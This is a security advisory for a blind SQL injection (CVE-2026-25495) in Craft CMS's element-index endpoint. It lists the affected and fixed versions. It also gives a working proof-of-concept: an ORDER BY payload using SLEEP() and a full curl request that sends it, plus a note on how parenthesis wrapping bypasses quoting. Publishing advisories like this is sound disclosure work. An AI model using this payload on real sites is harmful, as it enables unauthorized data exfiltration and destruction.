# [H] Craft CMS Vulnerable to SQL Injection in Element Indexes via `criteria[orderBy]`

## Summary
Severity: High
Advisory: GHSA-2453-mppf-46cj
CVE: CVE-2026-25495
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-2453-mppf-46cj
Type: github-advisory

## Affected
- Packagist: `craftcms/cms` — affected >=5.0.0-RC1 <5.8.22
- Packagist: `craftcms/cms` — affected >=4.0.0-RC1 <4.16.18

## Details
## Summary

The `element-indexes/get-elements` endpoint is vulnerable to **SQL Injection** via the `criteria[orderBy]` parameter (JSON body). The application fails to sanitize this input before using it in the database query.
An attacker with **Control Panel access** can inject arbitrary SQL into the `ORDER BY` clause by omitting `viewState[order]` (or setting both to the same payload).

> [!NOTE]
> The `ORDER BY` clause executes per row. `SLEEP(1)` on 10 rows = 10s delay.

---
## PoC
### Required Permissions

- Access to the Control Panel

### Steps to reproduce
1. Log in to the control panel
2. Navigate to any element index (e.g., **Users** `/admin/users`, **Entries**, **Assets**, etc.)
3. Intercept the `POST` request to `/index.php?p=admin/actions/element-indexes/get-elements`
4. Modify the JSON body to the following:
```json
{"context":"index","elementType":"craft\\elements\\User","source":"*","baseCriteria":{"siteId":1},"criteria":{"limit":100,"orderBy": "(elements.id) DESC, (SELECT SLEEP(5)) --"},"viewState":{"static":false}}
```
5. Send the request
6. Observe a delay in the response (delay = rows × sleep time)

Alternatively, you can use the following `curl` (bash syntax) command (replace cookie, CSRF token, and target domain as needed):
```bash
curl --path-as-is -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-CSRF-Token: <CSRF-TOKEN>' -H $'Content-Length: 208' -b $'<Cookie>' --data-binary $'{\"context\":\"index\",\"elementType\":\"craft\\\\elements\\\\User\",\"source\":\"*\",\"baseCriteria\":{\"siteId\":1},\"criteria\":{\"limit\":100,\"orderBy\": \"(elements.id) DESC, (SELECT SLEEP(0.2)) --\"},\"viewState\":{\"static\":false}}' $'http://craft.local/index.php?p=admin%2Factions%2Felement-indexes%2Fget-elements'
```

### Impact

With this Blind SQLi, an attacker can:
- **Exfiltrate data** character-by-character.
- **Modify or destroy data** (drop tables, update records, alter schema).

### Root Cause
The `orderBy` parameter is not validated or sanitized. Wrapping the payload in parentheses (e.g., `(elements.id)`) bypasses internal quoting mechanisms.

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-2453-mppf-46cj
- https://nvd.nist.gov/vuln/detail/CVE-2026-25495
- https://github.com/craftcms/cms/commit/96c60d775c644ff0a0276da52fe29e11d4cd38d2
- https://github.com/craftcms/cms
- https://github.com/craftcms/cms/releases/tag/4.16.18
- https://github.com/craftcms/cms/releases/tag/5.8.22
